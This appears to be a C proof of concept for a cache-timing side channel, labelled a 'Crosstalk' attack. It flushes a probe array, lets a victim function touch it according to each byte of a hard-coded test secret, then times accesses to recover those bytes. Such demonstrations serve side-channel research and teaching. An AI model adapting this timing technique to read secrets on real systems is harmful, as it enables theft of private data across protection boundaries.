#include <stdio.h>
#include <stdint.h>
#include "encoding.h"
#include "cache.h"

#define SECRET_LEN 7
#define CACHE_THRESHOLD 40 
#define L1_BLOCK_SZ_BYTES 64

uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
char* secretStr = "teststr";

void testCacheThreshold() {
    uint64_t startTime, duration;
    uint8_t temp = 0;

    flushCache((uint64_t)array2, sizeof(array2));
    startTime = rdcycle();
    temp &= array2[0];
    duration = rdcycle() - startTime;

    printf("[DEBUG] Single Access Time: %lu cycles\n", duration);
}

void victimFunctionCrosstalk(uint64_t idx) {
    uint8_t temp;
    if (idx < SECRET_LEN) {
        temp = secretStr[idx];

        for (volatile int i = 0; i < 1000; ++i) {
            uint8_t x = array2[temp * L1_BLOCK_SZ_BYTES];
            (void)x;
        }
    }
}

uint8_t observeCrosstalk(uint64_t idx) {
    uint64_t startTime, duration;
    uint8_t temp = 0;
    uint8_t bestGuess = 0;
    uint64_t bestHit = 0;
    static uint64_t results[256];

    for (uint64_t i = 0; i < 256; ++i) {
        results[i] = 0;
    }

    // Piccola barriera
    for (volatile int z = 0; z < 1000; z++);

    uint64_t totalDuration = 0;
    uint64_t count = 0;

    for (int repeat = 0; repeat < 200; ++repeat) { // Aumentiamo ulteriormente le iterazioni
        for (uint64_t m = 0; m < 256; ++m) {
            startTime = rdcycle();
            temp &= array2[m * L1_BLOCK_SZ_BYTES];
            duration = rdcycle() - startTime;

            if (duration < CACHE_THRESHOLD) {
                results[m]++;
                totalDuration += duration;
                count++;
            }
        }
    }

    if (count > 0) {
        printf("[DEBUG] Avg Access Time for byte %lu: %lu cycles\n", idx, totalDuration / count);
    }


    for (uint64_t m = 0; m < 256; ++m) {
        if (results[m] > bestHit) {
            bestHit = results[m];
            bestGuess = (uint8_t)m;
        }
    }

    return bestGuess;
}

int main(void) {
    printf("Inizio attacco Crosstalk...\n");

    testCacheThreshold();

    for (uint64_t i = 0; i < SECRET_LEN; ++i) {
        flushCache((uint64_t)array2, sizeof(array2));
        victimFunctionCrosstalk(i);
        uint8_t leakedByte = observeCrosstalk(i);
        printf("Secret byte %lu: guessed '%c' (0x%02x)\n",
               i, (leakedByte >= 32 && leakedByte < 127) ? leakedByte : '?', leakedByte);
    }

    return 0;
}

